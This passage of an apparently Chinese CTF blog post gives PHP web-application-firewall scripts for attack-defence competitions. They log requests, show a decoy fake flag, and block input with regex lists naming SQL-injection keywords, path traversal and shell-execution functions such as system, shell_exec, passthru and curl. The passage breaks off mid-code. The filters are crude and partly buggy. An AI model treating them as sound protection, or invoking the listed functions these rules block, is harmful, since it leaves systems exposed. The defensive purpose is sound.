class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs php">记录并过滤非法请求字符，若检测到请求字段中含有flag，则会显示假flag。<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;PRC&quot;</span>);<br><span class="hljs-comment">//这块在开始的代码没有的，我加的。不加就会报错。</span><br><span class="hljs-comment">//error_reporting(E_ALL);</span><br><span class="hljs-comment">//ini_set(&#x27;display_errors&#x27;, 1);</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** 线下攻防php版本waf</span><br><span class="hljs-comment">**</span><br><span class="hljs-comment">** Author: Y</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测请求方式，除了get和post之外拦截下来并写日志。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;method&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//获取url来进行检测</span><br><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取post的data，无论是否是mutipart</span><br><br><span class="hljs-variable">$headers</span> = <span class="hljs-title function_ invoke__">get_all_headers</span>(); <span class="hljs-comment">//获取header</span><br><br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$url</span>)))); <span class="hljs-comment">//对URL进行检测，出现问题则拦截并记录</span><br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$data</span>)))); <span class="hljs-comment">//对POST的内容进行检测，出现问题拦截并记录</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测过了则对输入进行简单过滤</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//对http请求头进行检测，出现问题拦截并记录</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//简单过滤</span><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http请求头并写入数组</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_all_headers</span>(<span class="hljs-params"></span>) </span>&#123; <br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(); <br> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br><span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>; <br>&#125; <br>&#125; <br> <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>; <br>&#125; <br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$ascii</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ascii</span>&gt;<span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>)&#123; <span class="hljs-comment">//有中文这里要修改</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>)))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;interrupt&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>), <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$str</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|delete\b|dumpfile\b|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|multipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;sqli&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//此处文件包含的检测我真的不会写了，求高人指点。。。</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>)&#123;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>))&#123; <br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;EXEC&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;GETFLAG&quot;</span>);<br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">简单将易出现问题的字符替换成中文</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http的请求包，意义在于获取别人的攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_http_raw</span>(<span class="hljs-params"></span>) </span>&#123; <br><span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br><br><span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>; <br> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>); <br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>); <br><span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\r\n&quot;</span>; <br>&#125; <br>&#125; <br><span class="hljs-variable">$raw</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-variable">$raw</span> .= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>; <br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这里拦截并记录攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>)</span>&#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- [&quot;</span>.<span class="hljs-variable">$alert</span>.<span class="hljs-string">&quot;]&quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-title function_ invoke__">get_http_raw</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;log_is_a_secret_file.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径 </span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);  <br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;f1989134-db6e-4769-ac1b-9d6ebf9ef46d&#125;&quot;</span>; <span class="hljs-comment">//如果请求带有flag关键字，显示假的flag。（2333333）</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">15</span>); <span class="hljs-comment">//拦截前延时15秒</span><br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><code class="hljs php">waf plus版本能过滤非法请求字符，非法函数，记录流量，显示假flag等。<br>建议使用waf_plus进行通防。<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOG_FILENAME&#x27;</span>, <span class="hljs-string">&#x27;Attack_Big_information.txt&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) <span class="hljs-variable">$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>))))) ] = <span class="hljs-variable">$value</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>    <span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>    <span class="hljs-variable">$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>();<br>    <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br>    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];<br>    <span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$files</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;virink&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$header</span>[<span class="hljs-string">&#x27;Accept&#x27;</span>]); <span class="hljs-comment">//fix a bug</span><br>    <span class="hljs-variable">$input</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;Get&quot;</span> =&gt; <span class="hljs-variable">$get</span>,<br>        <span class="hljs-string">&quot;Post&quot;</span> =&gt; <span class="hljs-variable">$post</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span> =&gt; <span class="hljs-variable">$cookie</span>,<br>        <span class="hljs-string">&quot;File&quot;</span> =&gt; <span class="hljs-variable">$files</span>,<br>        <span class="hljs-string">&quot;Header&quot;</span> =&gt; <span class="hljs-variable">$header</span><br>    );<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;select|insert|update|delete|and|or|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;<br>    <span class="hljs-variable">$vpattern</span> = 